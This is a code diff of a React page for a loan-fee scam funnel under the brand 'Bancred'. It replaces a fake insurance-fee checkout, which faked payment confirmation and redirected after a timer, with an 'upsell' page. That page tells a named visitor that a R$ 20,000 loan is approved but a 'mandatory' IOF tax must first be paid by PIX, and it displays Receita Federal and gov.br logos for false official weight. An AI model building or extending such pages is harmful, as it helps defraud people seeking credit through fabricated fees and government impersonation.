@@ -1,16 +1,21 @@
 import { useEffect, useMemo, useState } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import {
+  Landmark,
   ShieldCheck,
-  Info,
+  Wallet,
+  FileText,
+  CircleCheck,
   Clock,
   QrCode,
   Copy,
   Check,
   Loader2,
   X,
-  Wallet,
 } from "lucide-react";
+import logo from "@/assets/bancred-logo.png";
+import receitaLogo from "@/assets/receita-federal-logo.svg";
+import govbrLogo from "@/assets/govbr-logo.png";
 
 const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';
 
@@ -27,38 +32,21 @@ const PixIcon = ({ size = 20 }: { size?: number }) => (
   </svg>
 );
 
-const calcSeguro = (valor: number) => {
-  // ~0.685% do valor — ajustado para bater com R$ 34,23 em R$ 5.000
-  const total = +(valor * 0.006846).toFixed(2);
-  const morte = +(total * 0.36).toFixed(2);
-  const desemprego = +(total * 0.32).toFixed(2);
-  const emergencia = +(total - morte - desemprego).toFixed(2);
-  return { total, morte, desemprego, emergencia };
-};
-
 const PIX_PAYLOAD =
-  "00020101021226800014br.gov.bcb.pix2558qrcode.mkip.com.br/v1/2684c286-628c-4f2d-b1fd-20512cdb336b5204000053039865802BR5915TTKBRASILSEGURO6008SAOPAULO62070503***63044FF2";
+  "00020101021226800014br.gov.bcb.pix2558qrcode.mkip.com.br/v1/iof-bancred-up15204000053039865802BR5915TTKBRASILSEGURO6008SAOPAULO62070503***6304A1B2";
 
-const Pagamento = () => {
+const Up1 = () => {
   const [params] = useSearchParams();
   const navigate = useNavigate();
-  const valor = Number(params.get("valor") || 5000);
-  const seguro = useMemo(() => calcSeguro(valor), [valor]);
 
-  const [oferta, setOferta] = useState<"principal" | "extra1" | "extra2">("principal");
+  const nomeRaw = params.get("nome") || "";
+  const primeiroNome = (nomeRaw.split(" ")[0] || "Cliente").toUpperCase();
+  const valorAprovado = 20000;
+  const valorIOF = 21.22;
+
   const [showPix, setShowPix] = useState(false);
   const [pixLoading, setPixLoading] = useState(true);
   const [copied, setCopied] = useState(false);
-
-  const valorOfertaExtra1 = 7000;
-  const valorOfertaExtra2 = 10000;
-  const seguroExtra1 = useMemo(() => calcSeguro(valorOfertaExtra1), []);
-  const seguroExtra2 = useMemo(() => calcSeguro(valorOfertaExtra2), []);
-
-  const valorAtual =
-    oferta === "principal" ? valor : oferta === "extra1" ? valorOfertaExtra1 : valorOfertaExtra2;
-  const seguroAtual =
-    oferta === "principal" ? seguro : oferta === "extra1" ? seguroExtra1 : seguroExtra2;
 
   useEffect(() => {
     if (showPix) {
@@ -67,16 +55,6 @@ const Pagamento = () => {
       return () => clearTimeout(t);
     }
   }, [showPix]);
-
-  // Simula confirmação do pagamento e segue para o primeiro upsell (IOF)
-  useEffect(() => {
-    if (showPix && !pixLoading) {
-      const t = setTimeout(() => {
-        navigate(`/up1?${params.toString()}`);
-      }, 12000);
-      return () => clearTimeout(t);
-    }
-  }, [showPix, pixLoading, navigate, params]);
 
   const handleCopy = async () => {
     try {
@@ -88,145 +66,231 @@ const Pagamento = () => {
     }
   };
 
-  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=0&data=${encodeURIComponent(
-    PIX_PAYLOAD
-  )}`;
+  const qrUrl = useMemo(
+    () =>
+      `https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=0&data=${encodeURIComponent(PIX_PAYLOAD)}`,
+    []
+  );
 
-  const OfferCard = ({
-    id,
-    titulo,
-    valorEmp,
-    seg,
-    destaque,
-  }: {
-    id: "principal" | "extra1" | "extra2";
-    titulo: string;
-    valorEmp: number;
-    seg: ReturnType<typeof calcSeguro>;
-    destaque?: boolean;
-  }) => {
-    const active = oferta === id;
-    return (
-      <button
-        type="button"
-        onClick={() => setOferta(id)}
+  return (
+    <div
+      style={{
+        minHeight: "100dvh",
+        background: "#F4F4F7",
+        fontFamily: fontStack,
+        color: "#111827",
+        WebkitFontSmoothing: "antialiased",
+      }}
+    >
+      <header
         style={{
-          width: "100%",
-          background: "#fff",
-          border: `2px solid ${active ? "#1C68E3" : "#E5E7EB"}`,
-          borderRadius: 16,
-          padding: 16,
-          textAlign: "left",
-          cursor: "pointer",
-          fontFamily: fontStack,
-          marginBottom: 12,
-          boxShadow: active ? "0 6px 18px -8px rgba(28,104,227,0.35)" : "none",
-          transition: "border-color 0.2s",
+          background: "#FFFFFF",
+          borderBottom: "1px solid #E5E7EB",
+          padding: "14px 16px",
+          textAlign: "center",
         }}
       >
-        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 6 }}>
-          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+        <img src={logo} alt="Bancred" style={{ height: 76, width: "auto", display: "inline-block", objectFit: "contain" }} />
+      </header>
+
+      <main style={{ padding: "18px 16px 26px", maxWidth: 480, margin: "0 auto" }}>
+        <section
+          style={{
+            background: "linear-gradient(160deg, #FFFFFF 0%, #EFF6FF 100%)",
+            border: "1px solid #E5E7EB",
+            borderRadius: 22,
+            padding: "22px 18px 18px",
+            marginBottom: 14,
+            boxShadow: "0 14px 34px rgba(17, 24, 39, 0.08)",
+          }}
+        >
+          <div style={{ textAlign: "center", marginBottom: 18 }}>
+            <div
+              style={{
+                width: 76,
+                height: 76,
+                borderRadius: "50%",
+                background: "#FFFFFF",
+                color: "#1C68E3",
+                display: "inline-flex",
+                alignItems: "center",
+                justifyContent: "center",
+                marginBottom: 14,
+                border: "1px solid #DBEAFE",
+                boxShadow: "0 10px 22px rgba(28, 104, 227, 0.14)",
+              }}
+            >
+              <Landmark size={35} strokeWidth={2} />
+            </div>
+            <div
+              style={{
+                display: "inline-flex",
+                alignItems: "center",
+                gap: 6,
+                padding: "6px 10px",
+                borderRadius: 999,
+                background: "#DBEAFE",
+                color: "#1751B5",
+                fontSize: 12,
+                fontWeight: 800,
+                marginBottom: 10,
+              }}
+            >
+              <ShieldCheck size={14} /> Etapa fiscal obrigatória
+            </div>
+            <h1 style={{ fontSize: 24, fontWeight: 900, color: "#111827", marginBottom: 8, lineHeight: 1.16 }}>
+              {primeiroNome}, falta quitar o IOF do seu crédito
+            </h1>
+            <p style={{ fontSize: 14, lineHeight: 1.55, color: "#6B7280", margin: 0 }}>
+              O IOF é o Imposto sobre Operações Financeiras, uma cobrança federal obrigatória em operações de crédito.
+              Ele precisa ser regularizado para concluir a formalização e liberar o contrato.
+            </p>
+          </div>
+
+          <div
+            style={{
+              background: "#FFFFFF",
+              borderRadius: 16,
+              padding: 16,
+              border: "1px solid #DBEAFE",
+            }}
+          >
+            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", gap: 12 }}>
+              <div>
+                <div style={{ fontSize: 12, color: "#6B7280", marginBottom: 4 }}>Crédito aprovado</div>
+                <div style={{ fontSize: 30, fontWeight: 900, color: "#1C68E3" }}>{formatBRL(valorAprovado)}</div>
+              </div>
+              <span
+                style={{
+                  width: 48,
+                  height: 48,
+                  borderRadius: "50%",
+                  background: "#FFFFFF",
+                  color: "#1C68E3",
+                  display: "inline-flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  flexShrink: 0,
+                }}
+              >
+                <Wallet size={24} />
+              </span>
+            </div>
+          </div>
+        </section>
+
+        <div
+          style={{
+            background: "#FFFFFF",
+            borderRadius: 16,
+            padding: 18,
+            boxShadow: "0 1px 2px rgba(17, 24, 39, 0.04), 0 4px 12px rgba(17, 24, 39, 0.04)",
+            border: "1px solid #E5E7EB",
+            marginBottom: 14,
+          }}
+        >
+          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 12 }}>
             <span
               style={{
-                width: 18,
-                height: 18,
+                width: 34,
+                height: 34,
                 borderRadius: "50%",
-                border: `2px solid ${active ? "#1C68E3" : "#D1D5DB"}`,
+                background: "#F0FDF4",
+                color: "#16A34A",
                 display: "inline-flex",
                 alignItems: "center",
                 justifyContent: "center",
                 flexShrink: 0,
               }}
             >
-              {active && <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#1C68E3" }} />}
+              <FileText size={18} />
             </span>
-            <span style={{ fontSize: 13, fontWeight: 600, color: "#111827" }}>{titulo}</span>
-          </div>
-          {destaque && (
-            <span style={{ fontSize: 10, fontWeight: 700, color: "#15803D", background: "#DCFCE7", padding: "3px 8px", borderRadius: 999, letterSpacing: 0.3 }}>
-              SUA OFERTA
-            </span>
-          )}
-        </div>
-        <div style={{ display: "flex", alignItems: "baseline", justifyContent: "space-between", marginTop: 6 }}>
-          <div>
-            <div style={{ fontSize: 24, fontWeight: 800, color: "#1C68E3", letterSpacing: -0.5 }}>{formatBRL(valorEmp)}</div>
-            <div style={{ fontSize: 11, color: "#6B7280", marginTop: 2 }}>Liberação imediata</div>
-          </div>
-          <div style={{ textAlign: "right" }}>
-            <div style={{ fontSize: 11, color: "#6B7280" }}>Seguro</div>
-            <div style={{ fontSize: 18, fontWeight: 800, color: "#16A34A" }}>{formatBRL(seg.total)}</div>
-          </div>
-        </div>
-      </button>
-    );
-  };
-
-  return (
-    <div style={{ minHeight: "100dvh", background: "#F4F4F7", fontFamily: fontStack, color: "#111827", paddingBottom: showPix ? 0 : 32 }}>
-      <header style={{ background: "#fff", borderBottom: "1px solid #E5E7EB", padding: "14px 16px", textAlign: "center" }}>
-        <span style={{ fontSize: 22, fontWeight: 800, color: "#1C68E3", letterSpacing: -0.4 }}>Bancred</span>
-      </header>
-
-      <main style={{ padding: "18px 14px", maxWidth: 480, margin: "0 auto" }}>
-        <OfferCard id="principal" titulo="Você aprovado para empréstimo" valorEmp={valor} seg={seguro} destaque />
-
-        <div style={{ background: "#fff", border: "1px solid #E5E7EB", borderRadius: 16, padding: 16, marginBottom: 16 }}>
-          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12, color: "#1C68E3", fontWeight: 700, fontSize: 14 }}>
-            <Info size={16} /> Detalhamento da Tarifa de Seguro
+            <div>
+              <div style={{ fontSize: 15, fontWeight: 900, color: "#111827" }}>Por que o IOF é obrigatório?</div>
+              <div style={{ fontSize: 12, color: "#6B7280" }}>Registro fiscal da operação financeira</div>
+            </div>
           </div>
           {[
-            { l: "Cobertura por morte e invalidez", v: seguroAtual.morte },
-            { l: "Proteção contra desemprego", v: seguroAtual.desemprego },
-            { l: "Assistência 24h emergencial", v: seguroAtual.emergencia },
-          ].map((it) => (
-            <div key={it.l} style={{ display: "flex", justifyContent: "space-between", padding: "8px 0", fontSize: 13, color: "#374151", borderBottom: "1px dashed #F3F4F6" }}>
-              <span>{it.l}</span>
-              <span style={{ fontWeight: 600, color: "#111827" }}>{formatBRL(it.v)}</span>
+            "Imposto federal obrigatório para contratos de crédito",
+            "Necessário para emitir e validar a operação financeira",
+            "Liberação automática do crédito após a confirmação do PIX",
+          ].map((t) => (
+            <div key={t} style={{ display: "flex", alignItems: "center", gap: 8, fontSize: 13, color: "#111827", marginBottom: 7 }}>
+              <CircleCheck size={14} color="#16A34A" /> {t}
             </div>
           ))}
-          <div style={{ display: "flex", justifyContent: "space-between", paddingTop: 12, marginTop: 6, borderTop: "1px solid #E5E7EB", fontSize: 14, fontWeight: 700 }}>
-            <span>Total do seguro</span>
-            <span style={{ color: "#16A34A" }}>{formatBRL(seguroAtual.total)}</span>
-          </div>
         </div>
 
-        <h2 style={{ fontSize: 15, fontWeight: 700, marginBottom: 12 }}>
-          Temos mais 2 ofertas aprovadas pro seu CPF:
-        </h2>
-
-        <OfferCard id="extra1" titulo="Oferta turbinada" valorEmp={valorOfertaExtra1} seg={seguroExtra1} />
-        <OfferCard id="extra2" titulo="Oferta premium" valorEmp={valorOfertaExtra2} seg={seguroExtra2} />
+        <div
+          style={{
+            background: "#FFFFFF",
+            borderRadius: 16,
+            padding: 18,
+            boxShadow: "0 1px 2px rgba(17, 24, 39, 0.04), 0 4px 12px rgba(17, 24, 39, 0.04)",
+            border: "1px solid #D1D5DB",
+            marginBottom: 18,
+          }}
+        >
+          <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between", gap: 12 }}>
+            <div>
+              <div style={{ fontSize: 13, color: "#6B7280", marginBottom: 4 }}>IOF da operação de crédito</div>
+              <div style={{ fontSize: 34, fontWeight: 900, color: "#1C68E3", marginBottom: 8 }}>{formatBRL(valorIOF)}</div>
+            </div>
+            <div
+              style={{
+                padding: "6px 10px",
+                borderRadius: 999,
+                background: "#FFF7ED",
+                color: "#C2410C",
+                fontSize: 12,
+                fontWeight: 800,
+                whiteSpace: "nowrap",
+              }}
+            >
+              Pendente
+            </div>
+          </div>
+          <div style={{ fontSize: 13, lineHeight: 1.55, color: "#6B7280", borderTop: "1px solid #E5E7EB", paddingTop: 12 }}>
+            Esse imposto é vinculado ao CPF e ao valor aprovado, sendo exigido antes da liberação para registrar a operação dentro das normas financeiras.
+          </div>
+        </div>
 
         <button
           type="button"
           onClick={() => setShowPix(true)}
           style={{
             width: "100%",
-            padding: "16px 20px",
+            padding: "15px 20px",
             background: "#16A34A",
             color: "#fff",
             border: "none",
             borderRadius: 14,
             fontSize: 16,
             fontWeight: 700,
+            letterSpacing: -0.2,
             cursor: "pointer",
-            boxShadow: "0 10px 24px rgba(22,163,74,0.32)",
+            boxShadow: "0 8px 24px rgba(22, 163, 74, 0.25)",
             display: "inline-flex",
             alignItems: "center",
             justifyContent: "center",
-            gap: 10,
+            gap: 8,
             fontFamily: fontStack,
-            minHeight: 54,
-            marginTop: 8,
+            minHeight: 52,
           }}
         >
-          <PixIcon size={20} /> Pagar {formatBRL(seguroAtual.total)} via PIX
+          <PixIcon size={20} /> Pagar IOF e liberar crédito
         </button>
 
-        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, fontSize: 12, color: "#6B7280", marginTop: 14 }}>
-          <ShieldCheck size={14} color="#16A34A" /> Pagamento 100% seguro com criptografia
-        </div>
+        <footer style={{ marginTop: 22, textAlign: "center" }}>
+          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 18, marginBottom: 10 }}>
+            <img src={receitaLogo} alt="Receita Federal do Brasil" style={{ height: 64, width: "auto", opacity: 0.85, display: "block" }} />
+            <div style={{ width: 1, height: 46, background: "#E5E7EB" }} />
+            <img src={govbrLogo} alt="gov.br" style={{ height: 32, width: "auto", opacity: 0.9, display: "block" }} />
+          </div>
+          <div style={{ fontSize: 11, lineHeight: 1.45, color: "#6B7280" }}>
+            IOF vinculado às diretrizes fiscais aplicáveis às operações financeiras.
+          </div>
+        </footer>
       </main>
 
       {showPix && (
@@ -262,7 +326,7 @@ const Pagamento = () => {
             <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
               <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                 <PixIcon size={22} />
-                <span style={{ fontSize: 18, fontWeight: 700 }}>Pagar com PIX</span>
+                <span style={{ fontSize: 18, fontWeight: 700 }}>Pagar IOF com PIX</span>
               </div>
               <button
                 type="button"
@@ -289,7 +353,7 @@ const Pagamento = () => {
               <div>
                 <div style={{ fontSize: 12, color: "#15803D", fontWeight: 600 }}>Valor a pagar</div>
                 <div style={{ fontSize: 24, fontWeight: 800, color: "#16A34A", letterSpacing: -0.4 }}>
-                  {formatBRL(seguroAtual.total)}
+                  {formatBRL(valorIOF)}
                 </div>
               </div>
               <div
@@ -398,13 +462,6 @@ const Pagamento = () => {
                   <Loader2 size={16} style={{ animation: "spin 1.4s linear infinite", flexShrink: 0 }} />
                   Aguardando confirmação do pagamento...
                 </div>
-
-                <div style={{ marginTop: 14, fontSize: 11.5, color: "#6B7280", textAlign: "center", lineHeight: 1.55, display: "inline-flex", alignItems: "flex-start", gap: 6 }}>
-                  <Wallet size={12} style={{ marginTop: 2, flexShrink: 0 }} />
-                  <span>
-                    Após o pagamento, o valor é liberado automaticamente. Pagamento processado com criptografia ponta a ponta.
-                  </span>
-                </div>
               </>
             )}
           </div>
@@ -414,4 +471,4 @@ const Pagamento = () => {
   );
 };
 
-export default Pagamento;
+export default Up1;
